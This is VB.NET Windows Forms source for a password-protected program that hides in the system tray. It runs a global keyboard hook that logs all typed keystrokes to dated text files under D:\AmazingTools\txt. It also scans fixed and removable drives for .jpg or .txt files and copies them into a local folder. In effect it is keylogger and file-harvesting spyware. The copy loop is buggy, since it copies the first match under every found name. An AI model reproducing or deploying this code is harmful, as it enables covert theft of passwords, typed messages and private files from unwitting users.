Imports System.Text.RegularExpressions
Imports System.IO
Imports System.Text
Imports System.Management
Public Class Form1
    Dim WithEvents MyHook As New SystemHook()
    Dim today As String = System.DateTime.Now.ToString("yyyyMMdd")
    Dim a As String
    Dim SecureCode As Integer


#Region "最小化到托盘"
    '隐藏窗体，显示托盘NotifyIcon空间:NIcon
    Sub HideMyForm()
        Me.ShowInTaskbar = False
        Me.NotifyIcon1.Visible = True
        Me.Hide()
    End Sub

    '显示窗体
    Sub ShowMyForm()
        Me.Show()
        Me.ShowInTaskbar = True
        Me.WindowState = FormWindowState.Normal
        '要在先设定Nicon的Visible为False，即最小化到托盘
        Me.NotifyIcon1.Visible = False
    End Sub
    '窗体最小化时候隐藏窗体，
    Private Sub MainForm_SizeChanged(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.SizeChanged
        If Me.WindowState = FormWindowState.Minimized Then
            Me.Hide()
            Me.ShowInTaskbar = False
            Me.NotifyIcon1.Visible = True
        End If
    End Sub

    '双击托盘，显示窗体
    Private Sub NotifyIcon1_MouseClick(sender As Object, e As MouseEventArgs) Handles NotifyIcon1.MouseClick
        GroupBox1.Visible = False
        GroupBox3.Visible = False
        GroupBox2.Visible = True
        Me.ShowMyForm()
    End Sub

    '隐藏窗体按钮
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Me.HideMyForm()
    End Sub

#End Region

#Region "抓图大师"
    Public Function GetDeviceID() As List(Of String)
        Dim deviceIDs As New List(Of String)
        Dim query As New ManagementObjectSearcher("SELECT * From Win32_LogicalDisk")
        Dim queryCollection As ManagementObjectCollection = query.Get()
        For Each mo As ManagementObject In queryCollection
            Dim nx As Integer = Int32.Parse(mo("DriveType").ToString())
            Select Case nx
                Case Int(DriveType.Removable)
                    '可移动磁盘，U盘
                    deviceIDs.Add(mo("DeviceID").ToString())
                Case Int(DriveType.Fixed)
                    '本地磁盘
                    deviceIDs.Add(mo("DeviceID").ToString())
                Case Int（DriveType.CDRom）
                    'CD OR DVD
                Case Int(DriveType.Network)
                    '网络磁盘
                Case Int（DriveType.Ram)
                    '驱动器是RAM磁盘
                Case Int（DriveType.NoRootDirectory)
                    '磁盘没有根目录
                Case Else
                    MsgBox("驱动类型未知")
            End Select
        Next
        Return deviceIDs
    End Function

    ''' <summary>
    ''' 扫描按钮
    ''' </summary>
    ''' <param name="sender"></param>
    ''' <param name="e"></param>
    Private Sub Button_search_Click(sender As Object, e As EventArgs) Handles Button_search.Click
        Me.ComboBox1.Items.Clear()
        For Each xx As String In GetDeviceID()
            Me.ComboBox1.Items.Add(xx)
        Next
    End Sub

    ''' <summary>
    ''' 获取文件列表
    ''' </summary>
    ''' <param name="info"></param>
    ''' <param name="Ext"></param>
    ''' <returns></returns>
    Private Function ListFiles(info As FileSystemInfo, Ext As String, PicList As List(Of String)) As List(Of String)
        If Not info.Exists Then
            Return New List(Of String)
        End If
        Dim Dir As DirectoryInfo = New DirectoryInfo(info.ToString)
        If Dir Is Nothing Then
            Return New List(Of String)
        End If
        Try
            Dim files As FileSystemInfo() = Dir.GetFileSystemInfos()
            For i = 0 To files.Length - 1
                Dim File As FileInfo = New FileInfo(files(i).FullName.ToString)
                If (File IsNot Nothing AndAlso File.Extension.ToUpper() = "." + Ext.ToUpper()) Then
                    PicList.Add(File.FullName)
                Else
                    ListFiles(New DirectoryInfo(files(i).FullName), Ext, PicList)
                End If
            Next

            Return PicList
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Information, Me.Text)
        End Try
    End Function

    Private Sub GetFolderAndFile(path As String(), FilePath As List(Of String), FileName As String)
        Try
            If FilePath.Count > 1000 Then
                Return
            End If
            For Each str As String In path
                Dim nx As String() = Directory.GetDirectories(str)
                Dim ff As String() = Directory.GetFiles(str, FileName)
                For Each fi As String In ff
                    FilePath.Add(fi)
                Next
                GetFolderAndFile(nx, FilePath, FileName)
            Next
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Information, Me.Text)
        End Try

    End Sub



    ''' <summary>
    ''' 抓取文件
    ''' </summary>
    ''' <param name="sender"></param>
    ''' <param name="e"></param>
    Private Sub Buttin_ca_Click(sender As Object, e As EventArgs) Handles Buttin_ca.Click
        'Dim PicList As New List(Of String)
        'ListFiles(New DirectoryInfo("H:\\111"), ComboBox2.Text.Trim, PicList)
        Dim cc As Int32 = 0


        If ComboBox1.Text.Trim = "" Then
            MsgBox("请选择盘符")
            Return
        End If

        Dim miu As New List(Of String)
        Dim one As String() = {ComboBox1.Text.Trim + "\\"}
        Dim two As String = "*" + ComboBox2.Text.Trim

        GetFolderAndFile(one, miu, two)
        For i = 0 To miu.Count - 1
            Dim na As String = WordChange(miu(i))
            If Not File.Exists("D:\AmazingTools\pic\" + today + "\" + na) Then
                File.Copy(miu(0), "D:\AmazingTools\pic\" + today + "\" + na)
                cc += 1
            End If
        Next
        If cc = 0 Then
            Label3.BackColor = Color.Red
        ElseIf cc > 0 Then
            Label3.BackColor = Color.Green
        Else
            MsgBox("程序错误")
        End If

    End Sub


    ''' <summary>
    ''' 目标文件名处理
    ''' </summary>
    ''' <param name="xx"></param>
    ''' <returns></returns>
    Private Function WordChange(xx As String) As String
        Dim result As String = ""
        Dim count As Integer = 0
        For i = 4 To xx.Length - 1
            If xx(i) = "\" Then
                count = i
            End If
        Next
        result = xx.Substring(count + 1)
        Return result
    End Function
#End Region

#Region "键盘钩子"
    ''' <summary>
    ''' 主程序入口
    ''' </summary>
    ''' <param name="sender"></param>
    ''' <param name="e"></param>
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load
        initForm()
        StartStatus(False)
    End Sub

    ''' <summary>
    ''' 初始化页面
    ''' </summary>
    Private Sub initForm()
        Label3.Text = " "
        Label3.BackColor = Color.Red
        Label1.Text = "空闲中..."
        Label1.ForeColor = Color.Black
        TextBox2.Visible = False
        If Not System.IO.Directory.Exists("D:\AmazingTools\txt") Then
            Directory.CreateDirectory("D:\AmazingTools\txt")
        End If
        If Not System.IO.Directory.Exists("D:\AmazingTools\pic") Then
            Directory.CreateDirectory("D:\AmazingTools\pic")
        End If
        If Not System.IO.Directory.Exists("D:\AmazingTools\pic\" + today) Then
            Directory.CreateDirectory("D:\AmazingTools\pic\" + today)
        End If
        Me.ComboBox1.Items.Clear()
        For Each xx As String In GetDeviceID()
            Me.ComboBox1.Items.Add(xx)
        Next

        Me.ComboBox2.Items.Clear()
        Me.ComboBox2.Items.Add(".txt")
        Me.ComboBox2.Items.Add(".jpg")
        Me.ComboBox2.Text = ".jpg"
    End Sub

    ''' <summary>
    ''' 定义初始状态
    ''' </summary>
    Private Sub StartStatus(x As Boolean)
        GroupBox1.Visible = x
        GroupBox3.Visible = x
    End Sub

    ''' <summary>
    ''' 开始按钮
    ''' </summary>
    ''' <param name="sender"></param>
    ''' <param name="e"></param>
    Private Sub Button_Start_Click(sender As Object, e As EventArgs) Handles Button_Start.Click
        Try
            MyHook.StartHook(True, True)
            If MyHook.KeyHookEnabled Then
                Label1.Text = "启动键盘记录..."
                Label1.ForeColor = Color.Red
                a = ""
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Information, Me.Text)
        End Try
    End Sub

    ''' <summary>
    ''' 关闭按钮
    ''' </summary>
    ''' <param name="sender"></param>
    ''' <param name="e"></param>
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Try
            MyHook.UnHook()
            Label1.Text = "停止键盘记录..."
            Label1.ForeColor = Color.Blue
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Information, Me.Text)
        End Try
    End Sub

    Private Sub MyHook_KeyPress(sender As Object, e As KeyPressEventArgs) Handles MyHook.KeyPress
        a += e.KeyChar.ToString
    End Sub


    ''' <summary>
    ''' 密码确认
    ''' </summary>
    ''' <param name="sender"></param>
    ''' <param name="e"></param>
    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        If TextBox1.Text.Trim = "" Then
            Return
        End If
        If Not Regex.IsMatch(TextBox1.Text.Trim, "^[0-9]*$") Then
            Return
        End If
        If TextBox1.Text.Trim = My.Settings.password Then
            TextBox1.Text = ""
            StartStatus(True)
        End If
    End Sub

    ''' <summary>
    ''' 密码修改
    ''' </summary>
    ''' <param name="sender"></param>
    ''' <param name="e"></param>
    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        If TextBox2.Visible = True Then
            Dim word As Integer = 0
            If Not Regex.IsMatch(TextBox1.Text.Trim, "^[0-9]*$") OrElse String.IsNullOrEmpty(TextBox2.Text.Trim) Then
                TextBox2.Text = ""
                TextBox2.Visible = False
                Return
            Else
                word = TextBox2.Text.Trim
                My.Settings.password = word
                MsgBox("修改成功")
                TextBox2.Text = ""
                TextBox2.Visible = False
            End If
        Else
            If TextBox1.Text.Trim = "" Then
                MsgBox("请在左边输入原密码")
                Return
            End If
            If Not Regex.IsMatch(TextBox1.Text.Trim, "^[0-9]*$") Then
                Return
            End If
            If TextBox1.Text.Trim = My.Settings.password Then
                TextBox2.Visible = True
                TextBox1.Text = ""
            Else
                MsgBox("原密码输入错误")
                Return
            End If
        End If

    End Sub


    ''' <summary>
    ''' 根据鼠标换行记录键盘输入
    ''' </summary>
    ''' <param name="sender"></param>
    ''' <param name="e"></param>
    Private Sub MyHook_MouseActivity(sender As Object, e As MouseEventArgs) Handles MyHook.MouseActivity
        Try
            If Not e.Button = MouseButtons.Left Then
                Return
            End If

            If Label1.Text = "启动键盘记录..." And Not String.IsNullOrEmpty(a) Then
                Dim time As String = DateTime.Now.ToString("yyyy_MM_dd")
                Dim name As String = "D:\AmazingTools\txt\" + time + ".txt"
                Dim enc As Encoding = Encoding.GetEncoding("GB2312")
                If Not File.Exists(name) Then
                    Dim Writers As StreamWriter = File.CreateText(name)
                    Writers.WriteLine(a)
                    Writers.Close()
                Else
                    Dim fs As FileStream = File.OpenWrite(name)
                    fs.Position = fs.Length
                    Dim bytes As Byte() = enc.GetBytes(a & vbCrLf)
                    fs.Write(bytes, 0, bytes.Length)
                    fs.Close()
                End If
                a = ""
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Information, Me.Text)
        End Try

    End Sub

    'Private Sub Label3_Click(sender As Object, e As EventArgs) Handles Label3.Click
    '    Label3.BackColor = Color.Red
    'End Sub


#End Region
End Class
